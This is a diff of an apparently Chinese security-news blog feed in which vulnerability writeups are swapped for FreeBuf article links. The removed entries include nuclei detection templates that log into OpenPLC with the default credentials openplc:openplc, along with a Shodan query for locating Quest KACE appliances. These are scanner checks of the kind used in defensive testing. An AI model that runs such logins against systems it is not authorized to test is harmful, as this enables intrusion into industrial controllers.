-    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> ISPConfig language_edit.php PHP代码注入漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2023-46818</li></ul><p><strong>漏洞类型：</strong> 代码注入</p><p><strong>漏洞等级：</strong> 高危</p><p><strong>漏洞描述：</strong> 在ISPConfig 3.2.11p1之前的版本中，发现了一个问题。如果admin_allow_langedit被启用，管理员可以通过语言文件编辑器实现PHP代码注入。</p><p><strong>产品厂商：</strong> ISPConfig</p><p><strong>产品名称：</strong> ISPConfig</p><p><strong>影响版本：</strong> version &lt; 3.2.11p1</p><p><strong>来源：</strong> <a href="https://github.com/rapid7/metasploit-framework/issues/20348">https://github.com/rapid7/metasploit-framework/issues/20348</a></p><p><strong>类型：</strong> rapid7&#x2F;metasploit-framework:github issues</p><h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1><h3 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h3><p>ISPConfig language_edit.php PHP Code Injection<br>An issue was discovered in ISPConfig before 3.2.11p1. PHP code injection can be achieved in the language file editor by an admin if admin_allow_langedit is enabled.</p><h4 id="Basic-example"><a href="#Basic-example" class="headerlink" title="Basic example"></a>Basic example</h4><p>POC as msf module</p><p><a href="https://github.com/SyFi/CVE-2023-46818">https://github.com/SyFi/CVE-2023-46818</a><br><a href="https://karmainsecurity.com/KIS-2023-13">https://karmainsecurity.com/KIS-2023-13</a></p><p><img src="https://github.com/user-attachments/assets/66cdfa74-fd64-46a5-a3ac-e0d698f24ec5" alt="Image"></p>]]></content>
+    <content type="html"><![CDATA[<p><strong>公众号：</strong> FreeBuf</p><p><strong>链接：</strong> <a href="https://mp.weixin.qq.com/s/_bJxmIhvXRYBodiOAfUk9g">https://mp.weixin.qq.com/s/_bJxmIhvXRYBodiOAfUk9g</a></p>]]></content>
     
     
       
       
-    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; ISPConfig language_edit.php PHP代码注入漏洞&lt;/</summary>
+    <summary type="html">&lt;p&gt;&lt;strong&gt;公众号：&lt;/strong&gt; FreeBuf&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://mp.weixin.qq.com/s/_bJxmIhvXRYBodiOAfUk9g&quot;&gt;https://mp.weixin.q</summary>
       
     
     
     
-    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
+    <category term="微信公众号" scheme="http://example.com/categories/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7/"/>
     
     
-    <category term="rapid7/metasploit-framework:github issues" scheme="http://example.com/tags/rapid7-metasploit-framework-github-issues/"/>
+    <category term="mp.weixin.qq.com" scheme="http://example.com/tags/mp-weixin-qq-com/"/>
     
-    <category term="代码注入" scheme="http://example.com/tags/%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/"/>
+    <category term="FreeBuf" scheme="http://example.com/tags/FreeBuf/"/>
     
   </entry>
   
   <entry>
-    <title>OpenPLC v3 Authenticated RCE (CVE-2021-31630) - Passive Check</title>
-    <link href="http://example.com/2025/06/25/github_3632692995/"/>
-    <id>http://example.com/2025/06/25/github_3632692995/</id>
-    <published>2025-06-25T02:45:25.309Z</published>
-    <updated>2025-06-25T02:45:25.305Z</updated>
+    <title>6月24日，见证腾讯云大模型安全开箱发布！</title>
+    <link href="http://example.com/2025/06/25/weixin_4148524966/"/>
+    <id>http://example.com/2025/06/25/weixin_4148524966/</id>
+    <published>2025-06-25T05:22:40.376Z</published>
+    <updated>2025-06-25T05:22:40.373Z</updated>
     
-    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> OpenPLC v3 Authenticated RCE (CVE-2021-31630) - Passive Check</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2021-31630</li></ul><p><strong>漏洞类型：</strong> 命令执行</p><p><strong>漏洞等级：</strong> 高危</p><p><strong>漏洞描述：</strong> 尝试使用默认凭证登录并上传一个无害的自定义硬件层。如果上传和编译成功，服务器可能容易受到CVE-2021-31630的影响。</p><p><strong>产品厂商：</strong> thiagorossener</p><p><strong>产品名称：</strong> OpenPLC</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/blob/08c5ba235beecf30199d277cc62a69f814d67655/http%2Fcves%2F2021%2FCVE-2021-31630.yaml">https://github.com/projectdiscovery/nuclei-templates/blob/08c5ba235beecf30199d277cc62a69f814d67655/http%2Fcves%2F2021%2FCVE-2021-31630.yaml</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><h1 id="POC详情"><a href="#POC详情" class="headerlink" title="POC详情"></a>POC详情</h1><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs nix"><br><span class="hljs-params">id:</span> CVE-<span class="hljs-number">202</span>1-<span class="hljs-number">31630</span><br><br><span class="hljs-params">info:</span><br>  <span class="hljs-params">name:</span> OpenPLC v3 Authenticated RCE (CVE-<span class="hljs-number">202</span>1-<span class="hljs-number">31630</span>) <span class="hljs-operator">-</span> Passive Check<br>  <span class="hljs-params">author:</span> machevalia<br>  <span class="hljs-params">severity:</span> high<br>  <span class="hljs-params">description:</span> <span class="hljs-operator">&gt;</span><br>    Attempts to login <span class="hljs-keyword">with</span> default credentials and upload a benign custom hardware layer.<br>    If upload and compilation succeed, the server is likely vulnerable to CVE-<span class="hljs-number">202</span>1-<span class="hljs-number">31630</span>.<br>  <span class="hljs-params">reference:</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//nvd.nist.gov/vuln/detail/CVE-2021-31630</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//github.com/thiagorossener/openplc</span><br>  <span class="hljs-params">tags:</span> iot,plc,auth,openplc,cve,cve2021,rce<br><br><span class="hljs-params">variables:</span><br>  <span class="hljs-params">username:</span> <span class="hljs-string">&quot;openplc&quot;</span><br>  <span class="hljs-params">password:</span> <span class="hljs-string">&quot;openplc&quot;</span><br><br><span class="hljs-params">http:</span><br>  <span class="hljs-operator">-</span> <span class="hljs-params">raw:</span><br>      <span class="hljs-operator">-</span> |<br>        POST <span class="hljs-symbol">/login</span> HTTP<span class="hljs-symbol">/1.1</span><br>        <span class="hljs-params">Host:</span> &#123;&#123;Hostname&#125;&#125;<br>        <span class="hljs-params">Content-Type:</span> application<span class="hljs-symbol">/x-www-form-urlencoded</span><br><br>        <span class="hljs-attr">username</span><span class="hljs-operator">=</span>openplc&amp;password<span class="hljs-operator">=</span>openplc<br><br>      <span class="hljs-operator">-</span> |<br>        GET <span class="hljs-symbol">/hardware</span> HTTP<span class="hljs-symbol">/1.1</span><br>        <span class="hljs-params">Host:</span> &#123;&#123;Hostname&#125;&#125;<br><br>    <span class="hljs-params">cookie-reuse:</span> <span class="hljs-literal">true</span><br>    <span class="hljs-params">stop-at-first-match:</span> <span class="hljs-literal">false</span><br><br>    <span class="hljs-params">matchers:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> status<br>        <span class="hljs-params">status:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-number">200</span><br><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> word<br>        <span class="hljs-params">part:</span> body<br>        <span class="hljs-params">words:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;Hardware Layer Code Box&quot;</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;Save changes&quot;</span><br>        <span class="hljs-params">condition:</span> and<br><br></code></pre></td></tr></table></figure>]]></content>
+    <content type="html"><![CDATA[<p><strong>公众号：</strong> FreeBuf</p><p><strong>链接：</strong> <a href="https://mp.weixin.qq.com/s/QkF_BHKaBswzhWLAfeaKlg">https://mp.weixin.qq.com/s/QkF_BHKaBswzhWLAfeaKlg</a></p>]]></content>
     
     
       
       
-    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; OpenPLC v3 Authenticated RCE (CVE-2021-</summary>
+    <summary type="html">&lt;p&gt;&lt;strong&gt;公众号：&lt;/strong&gt; FreeBuf&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://mp.weixin.qq.com/s/QkF_BHKaBswzhWLAfeaKlg&quot;&gt;https://mp.weixin.q</summary>
       
     
     
     
-    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
+    <category term="微信公众号" scheme="http://example.com/categories/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7/"/>
     
     
-    <category term="命令执行" scheme="http://example.com/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
+    <category term="mp.weixin.qq.com" scheme="http://example.com/tags/mp-weixin-qq-com/"/>
     
-    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
+    <category term="FreeBuf" scheme="http://example.com/tags/FreeBuf/"/>
     
   </entry>
   
   <entry>
-    <title>Quest KACE System Management Appliance 任意命令执行漏洞</title>
-    <link href="http://example.com/2025/06/25/github_1057633275/"/>
-    <id>http://example.com/2025/06/25/github_1057633275/</id>
-    <published>2025-06-25T02:45:15.349Z</published>
-    <updated>2025-06-25T02:45:15.349Z</updated>
+    <title>Python标准库tarfile模块存在任意文件写入高危漏洞，PoC已公开</title>
+    <link href="http://example.com/2025/06/25/weixin_2466346991/"/>
+    <id>http://example.com/2025/06/25/weixin_2466346991/</id>
+    <published>2025-06-25T05:22:40.033Z</published>
+    <updated>2025-06-25T05:22:40.029Z</updated>
     
-    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Quest KACE System Management Appliance 任意命令执行漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2018-11138</li></ul><p><strong>漏洞类型：</strong> 命令执行</p><p><strong>漏洞等级：</strong> 严重</p><p><strong>漏洞描述：</strong> Quest KACE System Management Appliance 8.0.318中的’&#x2F;common&#x2F;download_agent_installer.php’脚本允许匿名用户访问，可被滥用以在系统上执行任意命令。</p><p><strong>产品厂商：</strong> Quest</p><p><strong>产品名称：</strong> KACE System Management Appliance</p><p><strong>影响版本：</strong> 8.0.318</p><p><strong>搜索语法：</strong> http.title:”kace systems management”</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/issues/12468">https://github.com/projectdiscovery/nuclei-templates/issues/12468</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1><h4 id="Description"><a href="#Description" class="headerlink" title="Description:"></a>Description:</h4><blockquote><p>The ‘&#x2F;common&#x2F;download_agent_installer.php’ script in the Quest KACE System Management Appliance 8.0.318 is accessible by anonymous users and can be abused to execute arbitrary commands on the system.</p></blockquote><h5 id="Severity-Critical"><a href="#Severity-Critical" class="headerlink" title="Severity: Critical"></a>Severity: <code>Critical</code></h5><h5 id="POC"><a href="#POC" class="headerlink" title="POC:"></a>POC:</h5><ul><li><a href="https://www.coresecurity.com/advisories/quest-kace-system-management-appliance-multiple-vulnerabilities">https://www.coresecurity.com/advisories/quest-kace-system-management-appliance-multiple-vulnerabilities</a></li><li><a href="https://www.exploit-db.com/exploits/44950/">https://www.exploit-db.com/exploits/44950/</a></li></ul><h4 id="KEV-True"><a href="#KEV-True" class="headerlink" title="KEV: True"></a>KEV: True</h4><h4 id="Shodan-Query-http-title-kace-systems-management"><a href="#Shodan-Query-http-title-kace-systems-management" class="headerlink" title="Shodan Query: http.title:&quot;kace systems management&quot;"></a>Shodan Query: <code>http.title:&quot;kace systems management&quot;</code></h4><blockquote><p>Acceptance Criteria: The template must include a complete POC and should not rely solely on version-based detection. Contributors are required to provide debug data(<code>-debug</code>) along with the template to help the triage team with validation or can also share a vulnerable environment like docker file. </p></blockquote><blockquote><p>Rewards will only be given once the template is fully validated by the team. Templates that are incomplete or invalid will not be accepted. Avoid adding code templates for CVEs that can be achieved using HTTP, TCP, or JavaScript. Such templates are blocked by default and won’t produce results, so we prioritize creating templates with other protocols unless exceptions are made.</p></blockquote><p>You can check the FAQ for the Nuclei Templates Community Rewards Program <a href="https://github.com/projectdiscovery/nuclei-templates/blob/main/Community-Rewards-FAQ.md">here</a>.</p>]]></content>
+    <content type="html"><![CDATA[<p><strong>公众号：</strong> FreeBuf</p><p><strong>链接：</strong> <a href="https://mp.weixin.qq.com/s/3Q2lniP0XDbgJvsbN8mmWw">https://mp.weixin.qq.com/s/3Q2lniP0XDbgJvsbN8mmWw</a></p>]]></content>
     
     
       
       
-    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; Quest KACE System Management Appliance </summary>
+    <summary type="html">&lt;p&gt;&lt;strong&gt;公众号：&lt;/strong&gt; FreeBuf&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://mp.weixin.qq.com/s/3Q2lniP0XDbgJvsbN8mmWw&quot;&gt;https://mp.weixin.q</summary>
       
     
     
     
-    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
+    <category term="微信公众号" scheme="http://example.com/categories/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7/"/>
     
     
-    <category term="命令执行" scheme="http://example.com/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
+    <category term="mp.weixin.qq.com" scheme="http://example.com/tags/mp-weixin-qq-com/"/>
     
-    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
+    <category term="FreeBuf" scheme="http://example.com/tags/FreeBuf/"/>
     
   </entry>
   
   <entry>
-    <title>OpenPLC Webserver v3 默认登录凭证漏洞</title>
-    <link href="http://example.com/2025/06/25/github_2718401373/"/>
-    <id>http://example.com/2025/06/25/github_2718401373/</id>
-    <published>2025-06-25T00:45:19.794Z</published>
-    <updated>2025-06-25T00:45:19.791Z</updated>
+    <title>XDigo恶意软件利用Windows LNK漏洞攻击东欧政府机构</title>
+    <link href="http://example.com/2025/06/25/weixin_2814845371/"/>
+    <id>http://example.com/2025/06/25/weixin_2814845371/</id>
+    <published>2025-06-25T05:22:39.706Z</published>
+    <updated>2025-06-25T05:22:39.701Z</updated>
     
-    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> OpenPLC Webserver v3 默认登录凭证漏洞</p><p><strong>漏洞类型：</strong> 弱口令</p><p><strong>漏洞等级：</strong> 高危</p><p><strong>漏洞描述：</strong> OpenPLC Webserver v3 存在默认登录凭证漏洞，攻击者可以使用默认用户名和密码（openplc:openplc）登录系统并访问需要认证的端点。</p><p><strong>产品厂商：</strong> OpenPLC</p><p><strong>产品名称：</strong> OpenPLC Webserver</p><p><strong>影响版本：</strong> v3</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/blob/f72fceadcfa96cf370dfc3894968460ca1bb7ab8/http%2Fdefault-logins%2Fothers%2Fopenplc-webserver-v3-default-login.yaml">https://github.com/projectdiscovery/nuclei-templates/blob/f72fceadcfa96cf370dfc3894968460ca1bb7ab8/http%2Fdefault-logins%2Fothers%2Fopenplc-webserver-v3-default-login.yaml</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><h1 id="POC详情"><a href="#POC详情" class="headerlink" title="POC详情"></a>POC详情</h1><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs nix"><br><span class="hljs-params">id:</span> openplc-webserver-v3-default-login<br><br><span class="hljs-params">info:</span><br>  <span class="hljs-params">name:</span> OpenPLC Webserver v3 <span class="hljs-operator">-</span> Default Login<br>  <span class="hljs-params">author:</span> machevalia<br>  <span class="hljs-params">severity:</span> high<br>  <span class="hljs-params">description:</span> <span class="hljs-operator">&gt;</span><br>    Checks <span class="hljs-keyword">if</span> OpenPLC is using default credentials (openplc:openplc) by logging <span class="hljs-keyword">in</span> and accessing an authenticated endpoint.<br>  <span class="hljs-params">tags:</span> iot,openplc,default-login,auth<br><br><span class="hljs-params">http:</span><br>  <span class="hljs-operator">-</span> <span class="hljs-params">raw:</span><br>      <span class="hljs-operator">-</span> |<br>        POST <span class="hljs-symbol">/login</span> HTTP<span class="hljs-symbol">/1.1</span><br>        <span class="hljs-params">Host:</span> &#123;&#123;Hostname&#125;&#125;<br>        <span class="hljs-params">Content-Type:</span> application<span class="hljs-symbol">/x-www-form-urlencoded</span><br><br>        <span class="hljs-attr">username</span><span class="hljs-operator">=</span>openplc&amp;password<span class="hljs-operator">=</span>openplc<br><br>      <span class="hljs-operator">-</span> |<br>        GET <span class="hljs-symbol">/dashboard</span> HTTP<span class="hljs-symbol">/1.1</span><br>        <span class="hljs-params">Host:</span> &#123;&#123;Hostname&#125;&#125;<br><br>    <span class="hljs-params">cookie-reuse:</span> <span class="hljs-literal">true</span><br>    <span class="hljs-params">stop-at-first-match:</span> <span class="hljs-literal">false</span><br><br>    <span class="hljs-params">matchers:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> status<br>        <span class="hljs-params">status:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-number">200</span><br><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> word<br>        <span class="hljs-params">part:</span> body<br>        <span class="hljs-params">words:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;Dashboard&quot;</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;Runtime Logs&quot;</span><br>        <span class="hljs-params">condition:</span> and<br><br></code></pre></td></tr></table></figure>]]></content>
+    <content type="html"><![CDATA[<p><strong>公众号：</strong> FreeBuf</p><p><strong>链接：</strong> <a href="https://mp.weixin.qq.com/s/0aD4AT1uXqMeqSk7zoNFWA">https://mp.weixin.qq.com/s/0aD4AT1uXqMeqSk7zoNFWA</a></p>]]></content>
     
     
       
       
-    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; OpenPLC Webserver v3 默认登录凭证漏洞&lt;/p&gt;
-&lt;p&gt;&lt;s</summary>
+    <summary type="html">&lt;p&gt;&lt;strong&gt;公众号：&lt;/strong&gt; FreeBuf&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://mp.weixin.qq.com/s/0aD4AT1uXqMeqSk7zoNFWA&quot;&gt;https://mp.weixin.q</summary>
       
     
     
     
-    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
+    <category term="微信公众号" scheme="http://example.com/categories/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7/"/>
     
     
-    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
+    <category term="mp.weixin.qq.com" scheme="http://example.com/tags/mp-weixin-qq-com/"/>
     
-    <category term="弱口令" scheme="http://example.com/tags/%E5%BC%B1%E5%8F%A3%E4%BB%A4/"/>
+    <category term="FreeBuf" scheme="http://example.com/tags/FreeBuf/"/>
     
   </entry>
   
   <entry>
-    <title>OpenPLC v3 认证远程代码执行漏洞</title>
-    <link href="http://example.com/2025/06/25/github_4103211448/"/>
-    <id>http://example.com/2025/06/25/github_4103211448/</id>
-    <published>2025-06-25T00:45:12.128Z</published>
-    <updated>2025-06-25T00:45:12.127Z</updated>
+    <title>赠书福利  经典升级，《零信任网络：在不可信网络中构建安全系统（第2版）》</title>
+    <link href="http://example.com/2025/06/25/weixin_2259348677/"/>
+    <id>http://example.com/2025/06/25/weixin_2259348677/</id>
+    <published>2025-06-25T05:22:39.067Z</published>
+    <updated>2025-06-25T05:22:39.061Z</updated>
     
-    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> OpenPLC v3 认证远程代码执行漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2021-31630</li></ul><p><strong>漏洞类型：</strong> 命令执行</p><p><strong>漏洞等级：</strong> 高危</p><p><strong>漏洞描述：</strong> OpenPLC v3存在默认凭证漏洞，攻击者可以利用默认凭证登录并上传自定义硬件层，如果上传和编译成功，服务器可能受到CVE-2021-31630漏洞的影响，导致远程代码执行。</p><p><strong>产品厂商：</strong> OpenPLC</p><p><strong>产品名称：</strong> OpenPLC</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/blob/f72fceadcfa96cf370dfc3894968460ca1bb7ab8/http%2Fcves%2F2021%2FCVE-2021-31630.yaml">https://github.com/projectdiscovery/nuclei-templates/blob/f72fceadcfa96cf370dfc3894968460ca1bb7ab8/http%2Fcves%2F2021%2FCVE-2021-31630.yaml</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><h1 id="POC详情"><a href="#POC详情" class="headerlink" title="POC详情"></a>POC详情</h1><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs nix"><br><span class="hljs-params">id:</span> CVE-<span class="hljs-number">202</span>1-<span class="hljs-number">31630</span><br><br><span class="hljs-params">info:</span><br>  <span class="hljs-params">name:</span> OpenPLC v3 Authenticated RCE (CVE-<span class="hljs-number">202</span>1-<span class="hljs-number">31630</span>) <span class="hljs-operator">-</span> Passive Check<br>  <span class="hljs-params">author:</span> machevalia<br>  <span class="hljs-params">severity:</span> high<br>  <span class="hljs-params">description:</span> <span class="hljs-operator">&gt;</span><br>    Attempts to login <span class="hljs-keyword">with</span> default credentials and upload a benign custom hardware layer.<br>    If upload and compilation succeed, the server is likely vulnerable to CVE-<span class="hljs-number">202</span>1-<span class="hljs-number">31630</span>.<br>  <span class="hljs-params">reference:</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//nvd.nist.gov/vuln/detail/CVE-2021-31630</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//github.com/thiagorossener/openplc</span><br>  <span class="hljs-params">tags:</span> iot,plc,auth,openplc,cve,cve2021,rce<br><br><span class="hljs-params">variables:</span><br>  <span class="hljs-params">username:</span> <span class="hljs-string">&quot;openplc&quot;</span><br>  <span class="hljs-params">password:</span> <span class="hljs-string">&quot;openplc&quot;</span><br><br><span class="hljs-params">http:</span><br>  <span class="hljs-operator">-</span> <span class="hljs-params">raw:</span><br>      <span class="hljs-operator">-</span> |<br>        POST <span class="hljs-symbol">/login</span> HTTP<span class="hljs-symbol">/1.1</span><br>        <span class="hljs-params">Host:</span> &#123;&#123;Hostname&#125;&#125;<br>        <span class="hljs-params">Content-Type:</span> application<span class="hljs-symbol">/x-www-form-urlencoded</span><br><br>        <span class="hljs-attr">username</span><span class="hljs-operator">=</span>openplc&amp;password<span class="hljs-operator">=</span>openplc<br><br>      <span class="hljs-operator">-</span> |<br>        GET <span class="hljs-symbol">/hardware</span> HTTP<span class="hljs-symbol">/1.1</span><br>        <span class="hljs-params">Host:</span> &#123;&#123;Hostname&#125;&#125;<br><br>    <span class="hljs-params">cookie-reuse:</span> <span class="hljs-literal">true</span><br>    <span class="hljs-params">stop-at-first-match:</span> <span class="hljs-literal">false</span><br><br>    <span class="hljs-params">matchers:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> status<br>        <span class="hljs-params">status:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-number">200</span><br><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> word<br>        <span class="hljs-params">part:</span> body<br>        <span class="hljs-params">words:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;Hardware Layer Code Box&quot;</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;Save changes&quot;</span><br>        <span class="hljs-params">condition:</span> and<br><br></code></pre></td></tr></table></figure>]]></content>
+    <content type="html"><![CDATA[<p><strong>公众号：</strong> FreeBuf</p><p><strong>链接：</strong> <a href="https://mp.weixin.qq.com/s/zbFg5OxMWG276GKtm-r8Qw">https://mp.weixin.qq.com/s/zbFg5OxMWG276GKtm-r8Qw</a></p>]]></content>
     
     
       
       
-    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; OpenPLC v3 认证远程代码执行漏洞&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;漏洞</summary>
+    <summary type="html">&lt;p&gt;&lt;strong&gt;公众号：&lt;/strong&gt; FreeBuf&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://mp.weixin.qq.com/s/zbFg5OxMWG276GKtm-r8Qw&quot;&gt;https://mp.weixin.q</summary>
       
     
     
     
-    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
+    <category term="微信公众号" scheme="http://example.com/categories/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7/"/>
     
     
-    <category term="命令执行" scheme="http://example.com/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
